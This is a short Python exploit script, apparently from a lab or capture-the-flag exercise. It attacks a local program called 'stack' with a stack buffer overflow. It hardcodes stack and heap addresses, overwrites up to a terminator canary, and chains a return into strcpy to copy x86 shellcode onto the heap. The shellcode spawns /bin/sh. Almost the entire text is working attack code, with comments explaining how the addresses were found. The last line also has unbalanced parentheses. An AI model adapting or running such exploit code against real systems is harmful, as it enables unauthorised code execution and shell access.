#  Payload
ebp = "\xb3\xfb\xff\xbf"  #  Address found via gdb
code_addr = "\xcb\xfb\xff\xbf"  # This is the stack pointer + 24 (size of canary on system)
strcpy = "\x44\x83\x04\x08"  # Address of strcpy using readelf -a stack|grep strcpy
heap_addr = "\xe4\x94\x04\x08"  # Address of heap readelf -S stack|grep [.]data
shellcode = """\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa
\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04
\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff
\xff\xff/bin/sh"""
canary = "\x0d\xff\x0a"  # Terminator canary value. Can write UP to it.
#  Call program
subprocess.call(["./stack", ("A"*24) + str(ebp+canary), str(strcpy+heap_addr+code_addr+shellcode))
